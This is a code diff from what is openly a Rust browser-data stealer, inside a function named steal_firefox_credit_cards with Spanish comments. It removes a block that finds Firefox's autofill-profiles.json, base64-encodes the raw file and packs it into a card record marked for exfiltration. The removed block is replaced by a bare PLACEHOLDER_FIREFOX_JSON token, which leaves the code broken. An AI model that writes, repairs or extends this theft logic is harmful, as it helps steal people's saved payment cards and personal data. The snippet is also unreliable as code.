@@ -994,30 +994,7 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
                     // ALTERNATIVA 1: autofill-profiles.json (Firefox antiguo)
                     let json_path = profile_path.join("autofill-profiles.json");
                     log(&format!("    🔍 Buscando alternativa: {}", json_path.display()));
-                    if json_path.exists() {
-                        log("    ✅ autofill-profiles.json ENCONTRADO!");
-
-                        // ESTRATEGIA: Exfiltrar archivo RAW
-                        if let Ok(file_data) = std::fs::read(&json_path) {
-                            log(&format!("    📄 Tamaño: {} bytes", file_data.len()));
-                            let b64_data = general_purpose::STANDARD.encode(&file_data);
-                            let profile_name = profile_path.file_name().and_then(|n| n.to_str()).unwrap_or("unknown");
-                            cards.push(CreditCard {
-                                browser: "Firefox-RAW-CARDS".to_string(),
-                                name_on_card: format!("{}::autofill-profiles.json", profile_name),
-                                card_number: b64_data,
-                                expiration_month: file_data.len() as i32,
-                                expiration_year: 9999,
-                                billing_address: Some("Base64 file".to_string()),
-                                nickname: None,
-                            });
-                            log("    ✅ Exfiltrado como Base64");
-                        }
-                    } else {
-                        log("    ⚠️  autofill-profiles.json tampoco existe");
-                    }
-
-                    continue;
+                    PLACEHOLDER_FIREFOX_JSON
                 }
                 
                 log("    ✅ DB ENCONTRADO!");
@@ -1400,3 +1377,4 @@ where
         Ok(result)
     }
 }
+
